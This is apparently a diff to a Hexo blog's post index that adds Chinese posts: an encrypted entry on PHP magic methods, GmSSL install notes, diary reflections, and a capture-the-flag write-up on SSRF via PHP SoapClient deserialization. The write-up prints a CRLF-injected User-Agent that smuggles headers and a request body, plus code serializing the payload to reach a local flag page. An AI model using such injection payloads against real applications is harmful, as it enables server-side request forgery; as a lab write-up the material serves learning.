@@ -74,6 +74,25 @@
     
     
     <entry>
+      <title>php魔术方法</title>
+      <link href="/2024/07/01/php%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/"/>
+      <url>/2024/07/01/php%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/</url>
+      
+        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="6a04f9115a7cc5b2a5a7b09e0e2d98a7e042ccd824882cabed7dd7d6ef118a61">4630436162ade97ba2718b7d0c4b3b631ce3008cbd2d9c6a68213d361e81f8e1bd659c61fc47becc7e1bf24793214fed6809c2537434d015b454b0630e7e676d599f3e122614fa106c5616d726d96356e07df6e33fa37ffd373f3db9595cc384d834297193f4da45398a03468496cbcbb4fe7221f3ec361afc5b628abcb2286c1f5ab66cfd8c76588fe4ac7ab2cd47a60040f10af0952580ac1d5a7969464ffbd60364d997cc44f2800f2a8ac7b94e306be962889142c62f9484b29fef522ff76bc0f4850473e2f41a03ad981d96ca2996ffd9332bb1c13ae5e44808535036bd2f0601f5685543f30158dda18492bbe78fcf73ccc9deab3b4657df08e08c5721342a1e72a3a7a25a62c41a0af6e1b60adaa2fdaab8518f2acb3ae6244d68a17208f878e3f3e271a07952c8f8e416d2bc8ea86d5d00846361658a8cabcbd966451151b542f59207912d686c7e77d2400121f2421dfc82278ee6a09ba5ef44bc3a37a6fe27b0445dd029d9e2f898ead232ca8aaa3af9a66af664ee4ee11775a187cdf48f239e4aff4bc4550b2cba2249fee37d1d6a1ca433660af6eae6a60e17ecae1fbcc1b2eee8e5ad564027535fd8851b8609c2bcb5e4ba7837cee47f8ead0a2240188c91917be88bfa05980858feb90085a710e362594ed054e29334fd5392b7ea9fe62102886202269f9ae2c9b37a1369beecc684b6aa2edbb4f674b8dd34650c9943abf63eb18d5deaf70bf83b91390b8ee3587bc36422176752d07c88ad536b8d83c652253429a9af24855a053700cba6d536a0653e7ab6ec36cc3d033dc686eb58797518317265c34c1cfc1bf586fd95c9c3f0815e70afa760751dd83cdbc9fb248d5acd960bb5ea2ec39d657f60ee23b820e5eadbbbca7f7d063dfb83790d93a5156da6fd60c20e98804dbc181a5d70a5adce837935d0f3a4c220429e402b13b11d07e43c6895fabadec8d07e299da5feb33d4e4aa49fd2dcc9a4262a401127f2d0cbf2fb638619a0bccf74f8a9aeb7b4ef4b85458e5d8d0df8b8d7a62b119dfde61ec57f64d5c3ea6f450e915c395f337b40e2a9997d40d37b9a92d0249d91d89d6afe81d6e223686b6069ca247db65fffe825f38135608244f8a8db5d9a71952e0a64864e28989449f402d5472d962ff7faeea63ad2ecba6660c66097c1a414dee0b7fd0172935079d40727473d3abf3cc9abaa568991c9cfc063f147eab0e7767479f7d0fc4510a30d211689bce97d98480d24e278fc56af144f11a6feb95f8b9d2ff7feea07d76061d9848ed30631c8d4b94fb26d2b5e9b55820cda86888c5f1a593ac56bef7c1019474093275c8a7134da7fc0cdc7176a76be438b35d7c01c3ac9d57a8c8759525790d9ae485bf8f16dd54ab59a904a9dc744ffb64583fde682d40f6492ba730115d172299e10bdbd345859a23cb987fe57f008d9a38362cca3fbe9992260b0fba5a8f299c995c15ee23154676cdbcd60905c96545a4d057ee6fed4dc4d7b9e1648c7fbb3c07d3af44567190c8cb334a2bfba2a5a054ca92015482a5062b048d665c6319ca9ca4e63e91c0fe830a66f91a20bf63b2e2064094cdd963dbf7f8e4a008e9d8f38434bb4d9156e92ddab700b3aaa13fb1f2abdd77032c2d99acc5edd62cda0b92e780a61110f6d0103a06bf4afb6932ffaca1fce56e2f39953eda30a086f6eaaa795d371e54c0b473174dcf17d11d748806e6ed47101e4face7732221bcc12a082b379db680804c6a7604f4937429f</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> 反序列化 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>Windows10安装netcat</title>
       <link href="/2024/06/30/Windows10%E5%AE%89%E8%A3%85netcat/"/>
       <url>/2024/06/30/Windows10%E5%AE%89%E8%A3%85netcat/</url>
@@ -112,6 +131,44 @@
     
     
     <entry>
+      <title>Soap原生类</title>
+      <link href="/2024/06/30/Soap%E5%8E%9F%E7%94%9F%E7%B1%BB/"/>
+      <url>/2024/06/30/Soap%E5%8E%9F%E7%94%9F%E7%B1%BB/</url>
+      
+        <content type="html"><![CDATA[<p>  利用SoapClient类进行SSRF</p><p><a href="https://zhuanlan.zhihu.com/p/80918004">https://zhuanlan.zhihu.com/p/80918004</a></p><p><a href="https://www.freebuf.com/articles/network/331981.html">https://www.freebuf.com/articles/network/331981.html</a></p><p>1.拿到题目之后，发现需要传入一个反序列化的参数，并且调用一个不存在的 getFlag()方法，而我么们知道，调用一个不存在的公共方法，就会自动调用__call方法，因此我们应去联想哪些原生类有<code>__call</code>方法，贴一个脚本：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$classes</span> = <span class="title function_ invoke__">get_declared_classes</span>();</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$classes</span> <span class="keyword">as</span> <span class="variable">$class</span>) &#123;</span><br><span class="line">    <span class="variable">$methods</span> = <span class="title function_ invoke__">get_class_methods</span>(<span class="variable">$class</span>);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$methods</span> <span class="keyword">as</span> <span class="variable">$method</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$method</span>, <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&#x27;__destruct&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__toString&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__wakeup&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__call&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__callStatic&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__get&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__set&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__isset&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__unset&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__invoke&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__set_state&#x27;</span></span><br><span class="line">        ))) &#123;</span><br><span class="line">            <span class="keyword">print</span> <span class="variable">$class</span> . <span class="string">&#x27;::&#x27;</span> . <span class="variable">$method</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2.想到这道题的提示，很容易想到ssrf中的SoapClient类，并且它也存在__call方法!</p><p>在php手册上查询发现，这个方法可以调用远程soap方法！</p><p><img src="/2024/06/30/Soap%E5%8E%9F%E7%94%9F%E7%B1%BB/026a20a84124471225829921876bc8f9.png" alt="026a20a84124471225829921876bc8f9"></p><p>那现在思路就清晰了：我们需要利用SoapClient类构造一个post请求，让ip&#x3D;127.0.0.1，携带token&#x3D;’ctfshow’。</p><p>3.首先需要构造UA头，绕过127.0.0.1的限制</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ua</span>=<span class="string">&quot;ctfshow\r\nX-Forwarded-For:127.0.0.1,127.0.0.1\r\nContent-Type:application/x-www-form-urlencoded\r\nContent-Length:13\r\n\r\ntoken=ctfshow&quot;</span></span><br></pre></td></tr></table></figure><p>“\r\n”是CRLF注入，代表着”回车换行”，而我们知道，请求头和请求体之间是存在换行的，因此Content-Length和token之间存在了两对”\r\n”。之所以要写两个127.0.0.1，是因为代码中使用了两次array_pop,每次会删除最后一个数组元素 ，因此为了将$ip赋值给127.0.0.1，所以需要写两个127.0.0.1,Content-Type是发送请求体的长度，”token&#x3D;ctfshow”,长度为13</p><p>4.查询手册，找到SoapClient类的构造方法所需要的参数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$client=new SoapClient(null,array(&#x27;uri&#x27;=&gt;&quot;127.0.0.1&quot;,&#x27;location&#x27;=&gt;&#x27;http://127.0.0.1/flag.php&#x27;,&#x27;user_agent&#x27;=&gt;$ua));</span><br></pre></td></tr></table></figure><p>第一个参数为null,表示非wsdl模式，反序列化的时候会对第二个参数指明的url进行soap请求。</p><p>第二个参数中，可以设置uri,location,user_agent等值。</p><p>uri：指定命名空间URI(Namespace URI)</p><p>location: 指定Web服务的URL地址</p><p>user_agent：指定HTTP请求的User-Agent头</p><p>5.整合以上数据，进行序列化，然后传参，访问flag.txt得到flag:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$ua</span>=<span class="string">&quot;ctfshow\r\nX-Forwarded-For:127.0.0.1,127.0.0.1\r\nContent-Type:application/x-www-form-urlencoded\r\nContent-Length:13\r\n\r\ntoken=ctfshow&quot;</span>;</span><br><span class="line"><span class="variable">$client</span>=<span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;uri&#x27;</span>=&gt;<span class="string">&quot;http://127.0.0.1/&quot;</span>,<span class="string">&#x27;location&#x27;</span>=&gt;<span class="string">&quot;http://127.0.0.1/flag.php&quot;</span>,<span class="string">&#x27;user_agent&#x27;</span>=&gt;<span class="variable">$ua</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serializez</span>(<span class="variable">$client</span>));</span><br></pre></td></tr></table></figure><p>netcat-win32-1.12</p><p>拓展：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">soap是什么</span><br><span class="line">1.soap是webserver的三要素之一(SOAP,WSDL,UDDI)</span><br><span class="line">Web服务的三要素通常指的是：</span><br><span class="line"></span><br><span class="line"><span class="code">    SOAP (Simple Object Access Protocol)：</span></span><br><span class="line"><span class="code">        SOAP是一种基于XML的协议，用于在Web服务中交换结构化数据。它定义了一种消息格式，使得不同的系统能够通过网络进行通信和数据交换。</span></span><br><span class="line"><span class="code"></span></span><br><span class="line"><span class="code">    WSDL (Web Services Description Language)：</span></span><br><span class="line"><span class="code">        WSDL是一种用于描述Web服务的XML语言。它提供了Web服务的公共接口的详细描述，包括服务的可用操作、输入和输出参数、消息格式以及如何访问服务的网络地址等。</span></span><br><span class="line"><span class="code"></span></span><br><span class="line"><span class="code">    UDDI (Universal Description, Discovery, and Integration)：</span></span><br><span class="line"><span class="code">        UDDI是一个用于Web服务的目录服务，它允许企业注册自己的Web服务，并且允许其他企业发现这些服务。UDDI提供了一种标准化的方式来发布、查找和集成Web服务。</span></span><br><span class="line"><span class="code"></span></span><br><span class="line">这三个要素共同构成了Web服务的基础架构，使得Web服务能够跨不同平台和语言进行交互。SOAP定义了数据交换的格式，WSDL提供了服务描述的标准，而UDDI提供了服务注册和发现的机制。通过这些技术，Web服务可以被创建、发现和使用，从而实现不同系统之间的互操作性。</span><br><span class="line"></span><br><span class="line">更容易理解的方式，我们可以将Web服务的三要素SOAP、WSDL和UDDI比作一个餐厅的服务系统：</span><br><span class="line"></span><br><span class="line"><span class="code">    SOAP（服务菜单）：</span></span><br><span class="line"><span class="code">        想象一下，SOAP就像餐厅里的菜单。当你走进餐厅，服务员会给你一份菜单，上面详细列出了所有可供选择的菜肴以及它们的描述。同样，SOAP是Web服务用来告诉其他计算机系统，它能够提供哪些服务，以及这些服务需要什么信息来执行。</span></span><br><span class="line"><span class="code"></span></span><br><span class="line"><span class="code">    WSDL（服务介绍）：</span></span><br><span class="line"><span class="code">        WSDL就像餐厅的介绍手册。当你想知道餐厅提供哪些类型的菜肴，或者你想了解如何点菜，这本手册会详细告诉你。在Web服务中，WSDL提供了服务的详细描述，包括服务能做什么，如何与服务交互，以及服务的地址等信息。</span></span><br><span class="line"><span class="code"></span></span><br><span class="line"><span class="code">    UDDI（餐厅目录）：</span></span><br><span class="line"><span class="code">        UDDI可以比作是一本餐厅黄页，它列出了所有可用的餐厅以及它们提供的服务。如果你想找到提供特定菜肴的餐厅，你可以查阅这本黄页。在Web服务的世界里，UDDI允许人们查找和发现不同的Web服务，了解它们提供的功能，并找到如何访问这些服务的方法。</span></span><br><span class="line"><span class="code"></span></span><br><span class="line">通过这个例子，我们可以将Web服务的三要素想象成在餐厅中点餐的过程：首先，你通过黄页（UDDI）找到你想尝试的餐厅；然后，你通过介绍手册（WSDL）了解餐厅提供的服务和如何点菜；最后，你使用菜单（SOAP）来实际下单，享受服务。这样，不同的计算机系统就像顾客一样，可以通过这些“要素”来发现和使用Web服务。</span><br></pre></td></tr></table></figure><p><a href="https://www.php.net/manual/en/extensions.alphabetical.php">https://www.php.net/manual/en/extensions.alphabetical.php</a></p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> 反序列化 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>hd</title>
+      <link href="/2024/06/22/hd/"/>
+      <url>/2024/06/22/hd/</url>
+      
+        <content type="html"><![CDATA[<p>​国密：SM3，kali安装</p><p>1.git clone <a href="https://github.com/guanzhi/GmSSL.git">https://github.com/guanzhi/GmSSL.git</a></p><p>2.解压（如果需要）</p><p>如果你下载的是压缩包（如<code>.tar.gz</code>或<code>.zip</code>），你需要先解压它。但如果你使用的是<code>git clone</code>命令，则不需要这一步，因为Git已经为你处理了下载和解压的过程。</p><p>3.进入源代码</p><p>cd GmSSL</p><p>4.编译配置</p><p>.&#x2F;config –prefix&#x3D;&#x2F;usr&#x2F;local&#x2F;gmssl –openssldir&#x3D;&#x2F;usr&#x2F;local&#x2F;gmssl no-shared</p><p>5.make编译</p><p>make</p><p>6.安装</p><p>make install</p><p>7.配置环境变量</p><p>安装完成后，为了让系统能够找到<code>gmssl</code>命令，你需要配置环境变量。这通常是在你的shell配置文件（如<code>~/.bashrc</code>或<code>~/.bash_profile</code>）中添加一行来指定<code>PATH</code>变量。打开文件并添加如下行：</p><p>export PATH&#x3D;$PATH:&#x2F;usr&#x2F;local&#x2F;gmssl&#x2F;bin</p><p>然后保存文件并运行<code>source ~/.bashrc</code>（或对应的shell配置文件）来使更改生效。</p><p>8.8. 验证安装</p><p>最后，你可以通过运行<code>gmssl version -a</code>命令来验证GmSSL是否成功安装。如果命令能够正确返回GmSSL的版本信息和其他相关细节，那么说明安装成功</p><p>二、py -m pip install gmssl</p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> ctf </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>6.21记录</title>
       <link href="/2024/06/21/6-21%E8%AE%B0%E5%BD%95/"/>
       <url>/2024/06/21/6-21%E8%AE%B0%E5%BD%95/</url>
@@ -123,6 +180,25 @@
         <tags>
             
             <tag> 生活 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>感想</title>
+      <link href="/2024/06/16/%E6%84%9F%E6%83%B3/"/>
+      <url>/2024/06/16/%E6%84%9F%E6%83%B3/</url>
+      
+        <content type="html"><![CDATA[<p>​6.16</p><p>​有时候，一些东西是不需要说的，被误解是人生的常态，不被误解才奇怪勒。但是如果不想被在意的人误解，那还是需要解释一下的。</p><p>​最爽的事情莫过于看着讨厌自己的人被打脸。</p><p>6.17</p><p>​对一项技能的喜欢不足以让我拥有它，</p><p>​决定我们成为什么样的人的，从来不是理想，而是行动。</p><p>​就算很小很小的行动也比想象中好太多太多。很年后的我会因为懒放弃一些东西，而现在的我也是这样做的。</p><p>​我现在坚持的事情，未来的我也也一定会坚持下去，而那些我始终没有做过的尝试，现在不去做的话，未来也不会去做的。</p><p>​有没有用是你行动以后才知道的—&gt;行动以后—&gt;新的反馈，新的发现–&gt;继续行动。</p><p>​不能太完美主义，接受行动后失败的可能。</p><p>​“你能控制的只有现在的行动，结果再重要，你控制不了”</p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> life </tag>
             
         </tags>
       
